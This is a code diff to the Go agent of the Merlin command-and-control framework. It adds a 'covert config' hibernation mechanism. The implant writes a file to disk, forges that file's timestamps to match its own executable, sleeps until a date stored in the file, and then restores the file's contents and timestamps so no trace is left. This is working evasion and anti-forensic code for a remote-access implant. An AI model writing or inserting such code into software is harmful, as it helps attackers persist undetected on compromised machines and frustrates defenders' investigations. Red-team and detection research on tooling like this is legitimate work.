@@ -20,12 +20,14 @@ package agent
 import (
 	// Standard
 	"fmt"
+	"io/ioutil"
 	"math/rand"
 	"net"
 	"os"
 	"os/user"
 	"runtime"
 	"strconv"
+	"strings"
 	"time"
 
 	// 3rd Party
@@ -40,7 +42,7 @@ import (
 )
 
 // GLOBAL VARIABLES
-var build = "nonRelease" // build is the build number of the Merlin Agent program set at compile time
+var build = "Release" // build is the build number of the Merlin Agent program set at compile time
 
 // Agent is a structure for agent objects. It is not exported to force the use of the New() function
 type Agent struct {
@@ -70,6 +72,7 @@ type Agent struct {
 	FailedCheckin      int                     // FailedCheckin is a count of the total number of failed check ins
 	Initial            bool                    // Initial identifies if the agent has successfully completed the first initial check in
 	KillDate           int64                   // killDate is a unix timestamp that denotes a time the executable will not run after (if it is 0 it will not be used)
+	CovertConfig       string                  // CovertConfig is the path to the file on disk used store the persistent hibernate sleeps
 }
 
 // Config is a structure that is used to pass in all necessary information to instantiate a new Agent
@@ -80,6 +83,7 @@ type Config struct {
 	InactiveThreshold  int    // InactiveThreshold is the number of check ins with no commands before an agent goes inactive
 	KillDate           string // KillDate is the date, as a Unix timestamp, that agent will quit running
 	MaxRetry           string // MaxRetry is the maximum amount of time an agent will fail to check in before it quits running
+	CovertConfig       string // CovertConfig is the path to the file on disk used store the persistent hibernate sleeps
 }
 
 // New creates a new agent struct with specific values and returns the object
@@ -210,6 +214,15 @@ func New(config Config) (*Agent, error) {
 		IntInactiveThreshold, _ := strconv.Atoi(StrInactiveThreshold)
 		agent.InactiveThreshold = IntInactiveThreshold
 	}
+	// Covert Config
+	if config.CovertConfig != "" {
+		agent.CovertConfig = config.CovertConfig
+	} else {
+		//200 character max
+		StrCovertConfigPre := "SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS"
+		StrCovertConfigPost := strings.Trim(StrCovertConfigPre, " ")
+		agent.CovertConfig = StrCovertConfigPost
+	}
 
 	agent.ActiveMin = agent.WaitTimeMin
 	agent.ActiveMax = agent.WaitTimeMax
@@ -238,12 +251,159 @@ func (a *Agent) Run() error {
 	cli.Message(cli.NOTE, fmt.Sprintf("Agent version: %s", a.Version))
 	cli.Message(cli.NOTE, fmt.Sprintf("Agent build: %s", build))
 
+	// Verify the agent's kill date hasn't been exceeded
+	if (a.KillDate != 0) && (time.Now().Unix() >= a.KillDate) {
+		cli.Message(cli.WARN, fmt.Sprintf("agent kill date has been exceeded: %s", time.Unix(a.KillDate, 0).UTC().Format(time.RFC3339)))
+		os.Exit(0)
+	}
+
+	// Check for the covert config
+	_, err := os.Stat(a.CovertConfig)
+
+	// Create if it doesn't exist
+	if os.IsNotExist(err) {
+		file, err2 := os.Create(a.CovertConfig)
+		if err2 == nil {
+			cli.Message(cli.NOTE, fmt.Sprintf("Covert config successfully created: %s", a.CovertConfig))
+			file.WriteString("0000000000")
+			file.Close()
+
+			//Touch match the file to the agent executable if possible
+			exepath, err3 := os.Executable()
+			if err3 == nil {
+				exepathfile, err4 := os.Stat(exepath)
+				if err4 != nil {
+					cli.Message(cli.WARN, fmt.Sprintf("Unable to stat agent executable: %s", err4.Error()))
+				} else {
+					modifiedtime := exepathfile.ModTime()
+					err5 := os.Chtimes(a.CovertConfig, modifiedtime, modifiedtime)
+					if err5 != nil {
+						cli.Message(cli.WARN, fmt.Sprintf("Failed to touch covert config: %s", err5.Error()))
+					} else {
+						cli.Message(cli.NOTE, fmt.Sprintf("Covert config last modified and accessed time set to: %s", modifiedtime))
+					}
+				}
+			} else {
+				cli.Message(cli.WARN, fmt.Sprintf("Failed to locate agent executable path: %s", err3.Error()))
+			}
+		} else {
+			cli.Message(cli.WARN, fmt.Sprintf("Error creating covert config: %s", err2.Error()))
+		}
+	} else {
+		cli.Message(cli.NOTE, fmt.Sprintf("Covert config detected: %s", a.CovertConfig))
+		// Attempt to read the covert config
+		covertconfigcontent, err6 := ioutil.ReadFile(a.CovertConfig)
+		if err6 == nil {
+			if string(covertconfigcontent) == "0000000000" {
+				cli.Message(cli.NOTE, fmt.Sprintf("Covert config content is the default, continue."))
+			} else {
+				// A date might be in the convert config!
+				int64convertconfig, err7 := strconv.ParseInt(string(covertconfigcontent), 10, 64)
+				if err7 == nil {
+					covertconfigdate := time.Unix(int64convertconfig, 0)
+					differenceintime := covertconfigdate.Sub(time.Now())
+					if int(differenceintime.Seconds()) > 0 {
+						cli.Message(cli.NOTE, fmt.Sprintf("Hibernation date is in the future! Sleeping for %d seconds", int(differenceintime.Seconds())))
+						// Sleep until specified hibernation time
+						time.Sleep(differenceintime)
+
+						// Get the file's touch time
+						origcovertconfigtimefile, err8 := os.Stat(a.CovertConfig)
+						var origcovertconfigtime time.Time
+						if err8 != nil {
+							cli.Message(cli.WARN, fmt.Sprintf("Unable to stat covert config: %s", err8.Error()))
+							origcovertconfigtime = time.Unix(0, 0)
+						} else {
+							origcovertconfigtime = origcovertconfigtimefile.ModTime()
+						}
+
+						// Set the default contents back
+						err9 := ioutil.WriteFile(a.CovertConfig, []byte("0000000000"), 0755)
+						if err9 == nil {
+							cli.Message(cli.NOTE, fmt.Sprintf("Reset the covert config."))
+							// Touch it back
+							if origcovertconfigtime != time.Unix(0, 0) {
+								err10 := os.Chtimes(a.CovertConfig, origcovertconfigtime, origcovertconfigtime)
+								if err10 != nil {
+									cli.Message(cli.WARN, fmt.Sprintf("Failed to touch covert config: %s", err10.Error()))
+								} else {
+									cli.Message(cli.NOTE, fmt.Sprintf("Covert config last modified and accessed time set to: %s", origcovertconfigtime))
+								}
+							}
+						} else {
+							cli.Message(cli.WARN, fmt.Sprintf("Error opening the covert config: %s", err9.Error()))
+						}
+					} else {
+						cli.Message(cli.WARN, fmt.Sprintf("Hibernation date is in the past or the covert config was corrupt"))
+						// Get the file's touch time
+						origcovertconfigtimefile, err11 := os.Stat(a.CovertConfig)
+						var origcovertconfigtime time.Time
+						if err11 != nil {
+							cli.Message(cli.WARN, fmt.Sprintf("Unable to stat covert config: %s", err11.Error()))
+							origcovertconfigtime = time.Unix(0, 0)
+						} else {
+							origcovertconfigtime = origcovertconfigtimefile.ModTime()
+						}
+
+						// Set the default contents back
+						err12 := ioutil.WriteFile(a.CovertConfig, []byte("0000000000"), 0755)
+						if err12 == nil {
+							cli.Message(cli.NOTE, fmt.Sprintf("Reset the covert config."))
+							// Touch it back
+							if origcovertconfigtime != time.Unix(0, 0) {
+								err13 := os.Chtimes(a.CovertConfig, origcovertconfigtime, origcovertconfigtime)
+								if err13 != nil {
+									cli.Message(cli.WARN, fmt.Sprintf("Failed to touch covert config: %s", err13.Error()))
+								} else {
+									cli.Message(cli.NOTE, fmt.Sprintf("Covert config last modified and accessed time set to: %s", origcovertconfigtime))
+								}
+							}
+						} else {
+							cli.Message(cli.WARN, fmt.Sprintf("Error opening the covert config: %s", err12.Error()))
+						}
+					}
+				} else {
+					cli.Message(cli.WARN, fmt.Sprintf("Covert config contents likely corrupted: %s", err7.Error()))
+					// Get the file's touch time
+					origcovertconfigtimefile, err14 := os.Stat(a.CovertConfig)
+					var origcovertconfigtime time.Time
+					if err14 != nil {
+						cli.Message(cli.WARN, fmt.Sprintf("Unable to stat covert config: %s", err14.Error()))
+						origcovertconfigtime = time.Unix(0, 0)
+					} else {
+						origcovertconfigtime = origcovertconfigtimefile.ModTime()
+					}
+
+					// Set the default contents back
+					err15 := ioutil.WriteFile(a.CovertConfig, []byte("0000000000"), 0755)
+					if err15 == nil {
+						cli.Message(cli.NOTE, fmt.Sprintf("Reset the covert config."))
+						// Touch it back
+						if origcovertconfigtime != time.Unix(0, 0) {
+							err16 := os.Chtimes(a.CovertConfig, origcovertconfigtime, origcovertconfigtime)
+							if err16 != nil {
+								cli.Message(cli.WARN, fmt.Sprintf("Failed to touch covert config: %s", err16.Error()))
+							} else {
+								cli.Message(cli.NOTE, fmt.Sprintf("Covert config last modified and accessed time set to: %s", origcovertconfigtime))
+							}
+						}
+					} else {
+						cli.Message(cli.WARN, fmt.Sprintf("Error opening the covert config: %s", err15.Error()))
+					}
+				}
+			}
+		} else {
+			cli.Message(cli.WARN, fmt.Sprintf("Unable to read covert config: %s", err6.Error()))
+		}
+	}
+
 	for {
 		// Verify the agent's kill date hasn't been exceeded
 		if (a.KillDate != 0) && (time.Now().Unix() >= a.KillDate) {
 			cli.Message(cli.WARN, fmt.Sprintf("agent kill date has been exceeded: %s", time.Unix(a.KillDate, 0).UTC().Format(time.RFC3339)))
 			os.Exit(0)
 		}
+
 		// Check in
 		if a.Initial {
 			cli.Message(cli.NOTE, "Checking in...")
